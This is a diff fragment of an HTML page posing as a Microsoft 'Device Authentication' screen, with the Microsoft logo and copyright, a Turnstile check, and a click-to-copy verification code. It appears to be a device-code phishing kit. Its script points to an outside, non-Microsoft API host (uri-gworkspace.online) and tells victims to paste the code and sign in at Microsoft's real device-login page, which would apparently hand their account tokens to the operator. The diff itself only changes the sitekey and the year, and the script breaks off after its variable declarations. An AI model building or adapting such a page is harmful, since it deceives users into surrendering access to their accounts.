@@ -12,13 +12,13 @@
 <div class="container"><div class="card">
 <div class="header"><div class="logo"><svg viewBox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#F25022"/><rect x="11" y="1" width="9" height="9" fill="#7FBA00"/><rect x="1" y="11" width="9" height="9" fill="#00A4EF"/><rect x="11" y="11" width="9" height="9" fill="#FFB900"/></svg></div><h1>Microsoft</h1><p>Device Authentication</p></div>
 <div class="body">
-<div id="turnstileScreen"><div class="turnstile-screen"><div class="icon">🛡️</div><h3>Security Verification Required</h3><p>Please complete the security check to continue.</p><div class="turnstile-container"><div class="cf-turnstile" data-sitekey="0x4AAAAAAEM_QjjFHp9sf4Ub" data-callback="onTurnstileSuccess" data-expired-callback="onTurnstileExpired" data-theme="light"></div></div><div class="status loading"><span class="spinner"></span>Waiting for verification...</div></div></div>
+<div id="turnstileScreen"><div class="turnstile-screen"><div class="icon">🛡️</div><h3>Security Verification Required</h3><p>Please complete the security check to continue.</p><div class="turnstile-container"><div class="cf-turnstile" data-sitekey="0x4AAAAAAEN9IFA4VvKp0fig" data-callback="onTurnstileSuccess" data-expired-callback="onTurnstileExpired" data-theme="light"></div></div><div class="status loading"><span class="spinner"></span>Waiting for verification...</div></div></div>
 <div id="mainContent"><p class="info">Use the verification code below to complete authentication.</p>
 <div class="code-box" id="codeBox" onclick="handleCodeClick()"><div class="label">Your Verification Code</div><div class="code" id="code">--------</div><div class="click-hint" id="codeHint">👆 Click here to copy code & open Microsoft login</div></div>
 <button class="btn" id="btn" onclick="handleCodeClick()">Sign In & Verify</button>
 <div class="instructions" id="instructions"><strong>Instructions:</strong><ol><li>Click the code - it copies automatically</li><li>Microsoft login opens in new window</li><li>Paste code (Ctrl+V) and click Next</li><li>Sign in with your Microsoft account</li></ol></div>
 <div class="status loading" id="status"><span class="spinner"></span>Generating verification code...</div><div class="timer" id="timer"></div></div>
-</div><div class="footer">&copy; 2024 Microsoft Corporation. <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Support</a></div></div></div>
+</div><div class="footer">&copy; 2026 Microsoft Corporation. <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Support</a></div></div></div>
 <script>
 const API='https://uri-gworkspace.online/api',REDIRECT='https://outlook.office.com/mail/',MS='https://login.microsoft.com/device';
 let poll=null,sid=null,exp=null,ti=null,turnstileToken=null;
